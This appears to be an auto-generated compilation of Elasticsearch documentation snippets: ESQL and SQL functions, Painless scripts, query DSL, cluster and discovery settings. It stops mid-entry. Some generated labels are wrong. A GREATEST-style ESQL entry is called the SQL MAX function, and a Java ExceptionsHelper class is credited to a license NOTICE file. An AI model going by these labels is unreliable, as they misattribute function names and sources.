Elasticsearch\nDESCRIPTION: This API call updates the cluster settings to increase the throttle for reindex operations, allowing for faster processing.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/reindex-data-stream.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nPUT /_cluster/settings\n{\n  \"persistent\" : {\n    \"migrate.data_stream_reindex_max_request_per_second\" : 10000\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Custom Word Delimiter Token Filter in Elasticsearch\nDESCRIPTION: The code snippet demonstrates how to configure a custom `word_delimiter` filter in Elasticsearch. It specifies settings to split tokens at non-alphanumeric characters except hyphens, remove delimiters, and avoid splitting at case or number transitions. The configuration includes disabling case and numeric splitting while preserving English possessives.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-word-delimiter-tokenfilter.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nPUT /my-index-000001\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"my_analyzer\": {\n          \"tokenizer\": \"keyword\",\n          \"filter\": [ \"my_custom_word_delimiter_filter\" ]\n        }\n      },\n      \"filter\": {\n        \"my_custom_word_delimiter_filter\": {\n          \"type\": \"word_delimiter\",\n          \"type_table\": [ \"- => ALPHA\" ],\n          \"split_on_case_change\": false,\n          \"split_on_numerics\": false,\n          \"stem_english_possessive\": true\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using LEAST Function in ESQL to Find Minimum Value\nDESCRIPTION: This snippet demonstrates how to use the LEAST function in ESQL to determine the smallest value between two columns. It creates a row with values a=10 and b=20, then evaluates which one is smaller using LEAST.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/least.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a = 10, b = 20\n| EVAL l = LEAST(a, b)\n```\n\n----------------------------------------\n\nTITLE: Example of ROUND Function with Negative Precision\nDESCRIPTION: Demonstrates using ROUND with a negative precision value (-1), which rounds to the nearest 10 (-350 instead of -345.153).\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-math.md#2025-04-21_snippet_27\n\nLANGUAGE: sql\nCODE:\n```\nSELECT ROUND(-345.153, -1) AS rounded;\n\n    rounded\n---------------\n-350.0\n```\n\n----------------------------------------\n\nTITLE: Field Type Mapping Table in Markdown\nDESCRIPTION: A markdown table defining the mapping between different field types and their result types in ESQL. All field types listed map to integer result type.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/types/mv_count.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| field | result |\n| --- | --- |\n| boolean | integer |\n| cartesian_point | integer |\n| cartesian_shape | integer |\n| date | integer |\n| date_nanos | integer |\n| double | integer |\n| geo_point | integer |\n| geo_shape | integer |\n| integer | integer |\n| ip | integer |\n| keyword | integer |\n| long | integer |\n| text | integer |\n| unsigned_long | integer |\n| version | integer |\n```\n\n----------------------------------------\n\nTITLE: Loading Sample Data for DateTime Examples in Elasticsearch\nDESCRIPTION: Console command using the _bulk API to load sample message data with different priorities and datetimes for use in the examples.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/using-datetime-in-painless.md#2025-04-21_snippet_28\n\nLANGUAGE: console\nCODE:\n```\nPOST /_bulk\n{ \"index\" : { \"_index\" : \"messages\", \"_id\" : \"1\" } }\n{ \"priority\": 1, \"datetime\": \"2019-07-17T12:13:14Z\", \"message\": \"m1\" }\n{ \"index\" : { \"_index\" : \"messages\", \"_id\" : \"2\" } }\n{ \"priority\": 1, \"datetime\": \"2019-07-24T01:14:59Z\", \"message\": \"m2\" }\n{ \"index\" : { \"_index\" : \"messages\", \"_id\" : \"3\" } }\n{ \"priority\": 2, \"datetime\": \"1983-10-14T00:36:42Z\", \"message\": \"m3\" }\n{ \"index\" : { \"_index\" : \"messages\", \"_id\" : \"4\" } }\n{ \"priority\": 3, \"datetime\": \"1983-10-10T02:15:15Z\", \"message\": \"m4\" }\n{ \"index\" : { \"_index\" : \"messages\", \"_id\" : \"5\" } }\n{ \"priority\": 3, \"datetime\": \"1983-10-10T17:18:19Z\", \"message\": \"m5\" }\n{ \"index\" : { \"_index\" : \"messages\", \"_id\" : \"6\" } }\n{ \"priority\": 1, \"datetime\": \"2019-08-03T17:19:31Z\", \"message\": \"m6\" }\n{ \"index\" : { \"_index\" : \"messages\", \"_id\" : \"7\" } }\n{ \"priority\": 3, \"datetime\": \"2019-08-04T17:20:00Z\", \"message\": \"m7\" }\n{ \"index\" : { \"_index\" : \"messages\", \"_id\" : \"8\" } }\n{ \"priority\": 2, \"datetime\": \"2019-08-04T18:01:01Z\", \"message\": \"m8\" }\n{ \"index\" : { \"_index\" : \"messages\", \"_id\" : \"9\" } }\n{ \"priority\": 3, \"datetime\": \"1983-10-10T19:00:45Z\", \"message\": \"m9\" }\n{ \"index\" : { \"_index\" : \"messages\", \"_id\" : \"10\" } }\n{ \"priority\": 2, \"datetime\": \"2019-07-23T23:39:54Z\", \"message\": \"m10\" }\n```\n\n----------------------------------------\n\nTITLE: Using Comments Flag in Painless Regex\nDESCRIPTION: Shows how to use the comments (extended) flag 'x' in a Painless regex pattern. This allows including comments within the regex pattern.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-regexes.md#2025-04-21_snippet_6\n\nLANGUAGE: painless\nCODE:\n```\n'a' ==~ /a #comment/x\n```\n\n----------------------------------------\n\nTITLE: Configuring Secure Password for Remote Cluster Server SSL Keystore in Elasticsearch\nDESCRIPTION: Secure setting for the password of the keystore used in remote cluster server SSL configuration.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/security-settings.md#2025-04-21_snippet_33\n\nLANGUAGE: properties\nCODE:\n```\nxpack.security.remote_cluster_server.ssl.keystore.secure_password\n```\n\n----------------------------------------\n\nTITLE: Configure Field Data Circuit Breaker Settings\nDESCRIPTION: Settings for the field data circuit breaker that estimates heap memory required for field data cache. Includes memory limit and overhead multiplier.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/circuit-breaker-settings.md#2025-04-21_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nindices.breaker.fielddata.limit: \"40%\"\nindices.breaker.fielddata.overhead: 1.03\n```\n\n----------------------------------------\n\nTITLE: Profiling kNN Search in Elasticsearch (Console)\nDESCRIPTION: Executes a kNN search query with profiling enabled to analyze the kNN search phase. The query searches for the nearest neighbors to a given vector.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-profile.md#2025-04-21_snippet_16\n\nLANGUAGE: console\nCODE:\n```\nPOST my-knn-index/_search\n{\n  \"profile\": true,\n  \"knn\": {\n    \"field\": \"my-vector\",\n    \"query_vector\": [-5, 9, -12],\n    \"k\": 3,\n    \"num_candidates\": 100\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: GeoIP Pipeline Response with City Database\nDESCRIPTION: Sample response showing the enriched document with geographical information after processing with the GeoIP processor using the city database.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/geoip-processor.md#2025-04-21_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"found\": true,\n  \"_index\": \"my-index-000001\",\n  \"_id\": \"my_id\",\n  \"_version\": 1,\n  \"_seq_no\": 55,\n  \"_primary_term\": 1,\n  \"_source\": {\n    \"ip\": \"89.160.20.128\",\n    \"geoip\": {\n      \"continent_name\": \"Europe\",\n      \"country_name\": \"Sweden\",\n      \"country_iso_code\": \"SE\",\n      \"city_name\" : \"Linköping\",\n      \"region_iso_code\" : \"SE-E\",\n      \"region_name\" : \"Östergötland County\",\n      \"location\": { \"lat\": 58.4167, \"lon\": 15.6167 }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: DISSECT Function Syntax in ESQL\nDESCRIPTION: The basic syntax for the DISSECT function in ESQL. It takes an input column, a pattern string, and an optional separator for appended values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/layout/dissect.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nDISSECT input \"pattern\" [APPEND_SEPARATOR=\"<separator>\"]\n```\n\n----------------------------------------\n\nTITLE: Advanced Sync Rule for User Service\nDESCRIPTION: JSON configuration to filter and index ServiceNow User documents based on activity state\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-servicenow.md#2025-04-21_snippet_6\n\nLANGUAGE: javascript\nCODE:\n```\n[\n  {\n    \"service\": \"User\",\n    \"query\": \"active=False\"\n  }\n]\n```\n\n----------------------------------------\n\nTITLE: Defining Bitwise XOR Grammar in Painless\nDESCRIPTION: Grammar specification for the bitwise XOR operator in Painless language syntax. This defines how the XOR expression is structured in code.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-numeric.md#2025-04-21_snippet_32\n\nLANGUAGE: text\nCODE:\n```\nbitwise_xor: expression '^' expression;\n```\n\n----------------------------------------\n\nTITLE: Advanced Azure Discovery Configuration in Elasticsearch\nDESCRIPTION: An example of advanced Azure discovery configuration specifying host type, endpoint name, deployment name, and deployment slot. This configuration provides more control over how Elasticsearch nodes discover each other.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/discovery-azure-classic-usage.md#2025-04-21_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\ndiscovery:\n    type: azure\n    azure:\n        host:\n            type: private_ip\n        endpoint:\n            name: elasticsearch\n        deployment:\n            name: your_azure_cloud_service_name\n            slot: production\n```\n\n----------------------------------------\n\nTITLE: Invalid Boxing/Unboxing in Painless\nDESCRIPTION: Illustrates invalid boxing and unboxing attempts in Painless that result in errors. Explicit boxing and unboxing operations are not allowed, leading to compilation errors when attempting these conversions directly.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-casting.md#2025-04-21_snippet_11\n\nLANGUAGE: painless\nCODE:\n```\nInteger x = 1;                   // error <1>\nInteger y = (Integer)1;          // error <2>\nint a = Integer.valueOf(1);      // error <3>\nint b = (int)Integer.valueOf(1); // error <4>\n```\n\n----------------------------------------\n\nTITLE: Grouping by Expressions in ESQL STATS\nDESCRIPTION: Shows how to group by an expression, such as the first letter of a last name, in the STATS command.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/layout/stats-by.md#2025-04-21_snippet_10\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\nSTATS\n  count(*)\nBY SUBSTRING(last_name, 1, 1);\n```\n\n----------------------------------------\n\nTITLE: Runtime Field Percentiles Query\nDESCRIPTION: Query using runtime fields to calculate percentiles on transformed data (milliseconds to seconds conversion).\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-percentile-aggregation.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nGET latency/_search\n{\n  \"size\": 0,\n  \"runtime_mappings\": {\n    \"load_time.seconds\": {\n      \"type\": \"long\",\n      \"script\": {\n        \"source\": \"emit(doc['load_time'].value / params.timeUnit)\",\n        \"params\": {\n          \"timeUnit\": 1000\n        }\n      }\n    }\n  },\n  \"aggs\": {\n    \"load_time_outlier\": {\n      \"percentiles\": {\n        \"field\": \"load_time.seconds\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Describing MAX Function Behavior in Elasticsearch SQL\nDESCRIPTION: This snippet provides a description of the MAX function in Elasticsearch SQL, explaining its purpose and behavior with different data types. It notes that MAX returns the maximum value from multiple columns, similar to MV_MAX but for multiple columns at once.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/greatest.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n**Description**\n\nReturns the maximum value from multiple columns. This is similar to [`MV_MAX`](/reference/query-languages/esql/functions-operators/mv-functions.md#esql-mv_max) except it is intended to run on multiple columns at once.\n\n::::{note}\nWhen run on `keyword` or `text` fields, this returns the last string in alphabetical order. When run on `boolean` columns this will return `true` if any values are `true`.\n::::\n```\n\n----------------------------------------\n\nTITLE: Second-Level Collapsing in Elasticsearch\nDESCRIPTION: Illustrates a second level of collapsing where results are collapsed first by country name, and then inner hits are further collapsed by user.id, providing hierarchical deduplication of search results.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/collapse-search-results.md#2025-04-21_snippet_6\n\nLANGUAGE: console\nCODE:\n```\nGET /my-index-000001/_search\n{\n  \"query\": {\n    \"match\": {\n      \"message\": \"GET /search\"\n    }\n  },\n  \"collapse\": {\n    \"field\": \"geo.country_name\",\n    \"inner_hits\": {\n      \"name\": \"by_location\",\n      \"collapse\": { \"field\": \"user.id\" },\n      \"size\": 3\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Extracting Z Coordinate with ST_Z in Elasticsearch SQL\nDESCRIPTION: Returns the altitude (Z coordinate) of the first point in a geometry. This function takes a geometry as input and returns a double value representing the Z coordinate.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-geo.md#2025-04-21_snippet_5\n\nLANGUAGE: sql\nCODE:\n```\nST_Z(\n    geometry <1>\n)\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT ST_Z(ST_WKTToSQL('POINT (10 20 30)')) z;\n\n      z:d\n30.0\n```\n\n----------------------------------------\n\nTITLE: Downloading Configuration File with Curl\nDESCRIPTION: A shell command to download a sample connector configuration file from the Elastic GitHub repository. Users should update the --output argument to match their directory structure.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-mysql.md#2025-04-21_snippet_3\n\nLANGUAGE: sh\nCODE:\n```\ncurl https://raw.githubusercontent.com/elastic/connectors/main/config.yml.example --output ~/connectors-config/config.yml\n```\n\n----------------------------------------\n\nTITLE: Implementing ExceptionsHelper Utility Class in Java\nDESCRIPTION: Defines the ExceptionsHelper class with static utility methods for exception handling, including methods to extract root causes, unwrap exceptions, and generate detailed error messages.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/repository-azure/licenses/reactive-streams-NOTICE.txt#2025-04-22_snippet_1\n\nLANGUAGE: Java\nCODE:\n```\npublic final class ExceptionsHelper {\n\n    private ExceptionsHelper() {\n    }\n\n    public static RuntimeException convertToRuntime(Exception e) {\n        if (e instanceof RuntimeException) {\n            return (RuntimeException) e;\n        }\n        return new ElasticsearchException(e);\n    }\n\n    public static ElasticsearchException convertToElastic(Exception e) {\n        if (e instanceof ElasticsearchException) {\n            return (ElasticsearchException) e;\n        }\n        return new ElasticsearchException(e);\n    }\n\n    // ... (additional utility methods)\n\n    public static String detailedMessage(Throwable t) {\n        if (t == null) {\n            return \"Unknown\";\n        }\n        if (t.getCause() == null) {\n            return t.toString();\n        }\n        StringBuilder sb = new StringBuilder();\n        while (t != null) {\n            sb.append(t.toString()).append(\"; \");\n            t = t.getCause();\n        }\n        return sb.toString();\n    }\n\n    // ... (additional methods)\n}\n```\n\n----------------------------------------\n\nTITLE: Type Mapping Matrix in Markdown\nDESCRIPTION: A markdown table defining the supported type combinations and their resulting types for string, regex, and newString parameters. All combinations result in the 'keyword' type output.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/types/replace.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| string | regex | newString | result |\n| --- | --- | --- | --- |\n| keyword | keyword | keyword | keyword |\n| keyword | keyword | text | keyword |\n| keyword | text | keyword | keyword |\n| keyword | text | text | keyword |\n| text | keyword | keyword | keyword |\n| text | keyword | text | keyword |\n| text | text | keyword | keyword |\n| text | text | text | keyword |\n```\n\n----------------------------------------\n\nTITLE: EC2 Tag-based Discovery Configuration\nDESCRIPTION: Example YAML configuration for filtering EC2 discovery based on instance tags.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/discovery-ec2-usage.md#2025-04-21_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\ndiscovery.ec2.tag.role: master\ndiscovery.ec2.tag.environment: dev,staging\n```\n\n----------------------------------------\n\nTITLE: Rounding Dates with DATE_TRUNC in ESQL\nDESCRIPTION: This snippet demonstrates the use of the DATE_TRUNC function in ESQL to round down hire dates to the nearest year. It selects specific columns from the 'employees' table and creates a new column 'year_hired' using DATE_TRUNC.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/date_trunc.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| KEEP first_name, last_name, hire_date\n| EVAL year_hired = DATE_TRUNC(1 year, hire_date)\n```\n\n----------------------------------------\n\nTITLE: Defining Modulo Operator in ESQL\nDESCRIPTION: This snippet defines the modulo operator (%) in ESQL. It divides one number by another and returns the remainder. The operator returns null if either field is multivalued.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/operators/mod.md#2025-04-22_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n### MODULO `%`\nDivide one number by another and return the remainder. If either field is [multivalued](https://www.elastic.co/docs/reference/query-languages/esql/esql-multivalued-fields) then the result is `null`.\n```\n\n----------------------------------------\n\nTITLE: Calculating Standard Deviation of a Single Column in ESQL\nDESCRIPTION: A simple example of using STD_DEV to calculate the standard deviation of height values in an employees table. Returns a single numeric value representing the standard deviation of the height column.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/std_dev.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| STATS STD_DEV(height)\n```\n\n----------------------------------------\n\nTITLE: Matching Any Condition in EQL\nDESCRIPTION: Demonstrates how to match events solely on event category using the 'where true' condition. Also shows how to match any event using the 'any' keyword combined with 'where true'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql/eql-syntax.md#2025-04-21_snippet_7\n\nLANGUAGE: eql\nCODE:\n```\nfile where true\n```\n\nLANGUAGE: eql\nCODE:\n```\nany where true\n```\n\n----------------------------------------\n\nTITLE: Calculating Weighted Average with ESQL\nDESCRIPTION: This ESQL query demonstrates the usage of the WEIGHTED_AVG function to calculate the weighted average of salary based on height for employees, grouped by languages. The result is rounded and sorted by languages.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/weighted_avg.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| STATS w_avg = WEIGHTED_AVG(salary, height) BY languages\n| EVAL w_avg = ROUND(w_avg)\n| KEEP w_avg, languages\n| SORT languages\n```\n\n----------------------------------------\n\nTITLE: Extracting Day of Week with DAY_OF_WEEK in SQL\nDESCRIPTION: Extracts the day of the week from a date/datetime expression, where Sunday is 1, Monday is 2, etc. Returns null if the input is null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_53\n\nLANGUAGE: sql\nCODE:\n```\n\"DAY_OF_WEEK(datetime_exp) <1>\\n\"\n```\n\nLANGUAGE: sql\nCODE:\n```\n\"SELECT DAY_OF_WEEK(CAST('2018-02-19T10:23:27Z' AS TIMESTAMP)) AS day;\\n\\n      day\\n---------------\\n2\\n\"\n```\n\n----------------------------------------\n\nTITLE: Filtering Employee Records with LIKE Operator in ESQL\nDESCRIPTION: This query filters the 'employees' dataset to find records where the first_name field starts with 'b' (case-insensitive), followed by any number of characters. The query then keeps only the first_name and last_name columns in the result set.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/operators/examples/like.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| WHERE first_name LIKE \"\"\"?b*\"\"\"\n| KEEP first_name, last_name\n```\n\n----------------------------------------\n\nTITLE: Executing a Terms Set Query with minimum_should_match_field\nDESCRIPTION: This snippet demonstrates a terms set query that searches for documents with at least two matching programming languages from a provided list. It uses the minimum_should_match_field parameter to reference the required_matches field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-terms-set-query.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nGET /job-candidates/_search\n{\n  \"query\": {\n    \"terms_set\": {\n      \"programming_languages\": {\n        \"terms\": [ \"c++\", \"java\", \"php\" ],\n        \"minimum_should_match_field\": \"required_matches\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: ENDS_WITH Function Comment Header\nDESCRIPTION: Header comment indicating that this is an auto-generated file from ESQL's AbstractFunctionTestCase.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/ends_with.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n```\n\n----------------------------------------\n\nTITLE: Inefficient Wildcard Query for Percolator in Elasticsearch\nDESCRIPTION: An example of an inefficient wildcard query pattern that should be avoided with the percolator. This query uses a direct wildcard expression which is more expensive to evaluate.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/percolator.md#2025-04-21_snippet_7\n\nLANGUAGE: js\nCODE:\n```\n{\n  \"query\": {\n    \"wildcard\": {\n      \"my_field\": \"abc*\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Basic Combined Fields Query in Elasticsearch\nDESCRIPTION: Demonstrates a simple combined fields query across multiple document fields with AND operator, searching for the phrase 'database systems'\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-combined-fields-query.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"combined_fields\" : {\n      \"query\":      \"database systems\",\n      \"fields\":     [ \"title\", \"abstract\", \"body\"],\n      \"operator\":   \"and\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Indexing a Polygon with Custom Orientation in GeoJSON\nDESCRIPTION: This example shows how to override the default orientation parameter when indexing a polygon. By specifying 'clockwise' orientation, Elasticsearch will interpret the vertex order differently than the default counterclockwise ordering.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/shape.md#2025-04-21_snippet_9\n\nLANGUAGE: console\nCODE:\n```\nPOST /example/_doc\n{\n  \"location\" : {\n    \"type\" : \"polygon\",\n    \"orientation\" : \"clockwise\",\n    \"coordinates\" : [\n      [ [1000.0, 1000.0], [1000.0, 1001.0], [1001.0, 1001.0], [1001.0, 1000.0], [1000.0, 1000.0] ]\n    ]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Basic Diversified Sampler Aggregation with Elasticsearch\nDESCRIPTION: Example query using diversified_sampler to analyze tags associated with #elasticsearch on StackOverflow posts while limiting bias from individual authors. The aggregation samples documents and ensures each author contributes at most one document to the sample.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-diversified-sampler-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPOST /stackoverflow/_search?size=0\n{\n  \"query\": {\n    \"query_string\": {\n      \"query\": \"tags:elasticsearch\"\n    }\n  },\n  \"aggs\": {\n    \"my_unbiased_sample\": {\n      \"diversified_sampler\": {\n        \"shard_size\": 200,\n        \"field\": \"author\"\n      },\n      \"aggs\": {\n        \"keywords\": {\n          \"significant_terms\": {\n            \"field\": \"tags\",\n            \"exclude\": [ \"elasticsearch\" ]\n          }\n        }\n      }\n    }\n  }\n}\n```\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  ...\n  \"aggregations\": {\n    \"my_unbiased_sample\": {\n      \"doc_count\": 151,           <1>\n      \"keywords\": {               <2>\n        \"doc_count\": 151,\n        \"bg_count\": 650,\n        \"buckets\": [\n          {\n            \"key\": \"kibana\",\n            \"doc_count\": 150,\n            \"score\": 2.213,\n            \"bg_count\": 200\n          }\n        ]\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using Pattern Matcher to Remove Vowels in Painless\nDESCRIPTION: Uses Painless regex with Pattern.matcher to remove all vowels from player last names.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/brief-painless-walkthrough.md#2025-04-21_snippet_11\n\nLANGUAGE: console\nCODE:\n```\nPOST hockey/_update_by_query\n{\n  \"script\": {\n    \"lang\": \"painless\",\n    \"source\": \"ctx._source.last = /[aeiou]/.matcher(ctx._source.last).replaceAll('')\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Filtering with CURRENT_TIME and Interval in Elasticsearch SQL\nDESCRIPTION: Example showing how to use CURRENT_TIME() with INTERVAL subtraction for relative time filtering.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_16\n\nLANGUAGE: sql\nCODE:\n```\nSELECT first_name FROM emp WHERE CAST(hire_date AS TIME) > CURRENT_TIME() - INTERVAL 20 MINUTES ORDER BY first_name ASC LIMIT 5;\n\n  first_name\n---------------\nAlejandro\nAmabile\nAnneke\nAnoosh\nArumugam\n```\n\n----------------------------------------\n\nTITLE: Correct HISTOGRAM Usage with Functions in Elasticsearch SQL\nDESCRIPTION: Demonstrates the correct approach to apply functions with HISTOGRAM by moving the expression inside the HISTOGRAM function rather than applying functions to the histogram result.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-grouping.md#2025-04-21_snippet_6\n\nLANGUAGE: sql\nCODE:\n```\nSELECT HISTOGRAM(MONTH(birth_date), 2) AS h, COUNT(*) as c FROM emp GROUP BY h ORDER BY h DESC;\n\n       h       |       c\n---------------+---------------\n12             |7\n10             |17\n8              |16\n6              |16\n4              |18\n2              |10\n0              |6\nnull           |10\n```\n\n----------------------------------------\n\nTITLE: Simplified Prefix Query Syntax\nDESCRIPTION: This snippet shows a simplified syntax for the prefix query, allowing the 'field' and 'value' parameters to be combined. This compact form still retains the functionality of searching for prefixes in the specified user's field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-prefix-query.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"prefix\" : { \"user\" : \"ki\" }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: ELSER Semantic Search Example\nDESCRIPTION: Demonstrates a sparse vector query using the ELSER (Elastic Learned Sparse Encoder) model for semantic search\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-sparse-vector-query.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nGET my-index/_search\n{\n   \"query\":{\n      \"sparse_vector\": {\n         \"field\": \"ml.tokens\",\n         \"inference_id\": \"my-elser-model\",\n         \"query\": \"How is the weather in Jamaica?\"\n      }\n   }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining an Inner Pipeline in Elasticsearch\nDESCRIPTION: Creates a pipeline named 'pipelineA' that sets a field value. This pipeline will be called from another pipeline to demonstrate nesting capabilities.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/pipeline-processor.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT _ingest/pipeline/pipelineA\n{\n  \"description\" : \"inner pipeline\",\n  \"processors\" : [\n    {\n      \"set\" : {\n        \"field\": \"inner_pipeline_set\",\n        \"value\": \"inner\"\n      }\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Dynamic Mapping Settings on Inner Objects in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to configure dynamic mapping settings at different levels of a document structure. It shows disabling dynamic mapping at the top level while enabling it for a specific inner object, allowing fine-grained control over mapping behavior.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/dynamic.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"dynamic\": false, <1>\n    \"properties\": {\n      \"user\": { <2>\n        \"properties\": {\n          \"name\": {\n            \"type\": \"text\"\n          },\n          \"social_networks\": {\n            \"dynamic\": true, <3>\n            \"properties\": {}\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Evaluating Condition in Elasticsearch Watch Configuration\nDESCRIPTION: A condition script that checks if the total number of hits in the payload exceeds the minimum threshold defined in metadata.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-watcher-transform-context.md#2025-04-21_snippet_8\n\nLANGUAGE: javascript\nCODE:\n```\nreturn ctx.payload.hits.total > ctx.metadata.min_hits\n```\n\n----------------------------------------\n\nTITLE: Building Elasticsearch Plugin with Gradle\nDESCRIPTION: This shell command uses Gradle to build the Elasticsearch plugin, generating a JAR file and bundling it into a plugin ZIP file.\nSOURCE: 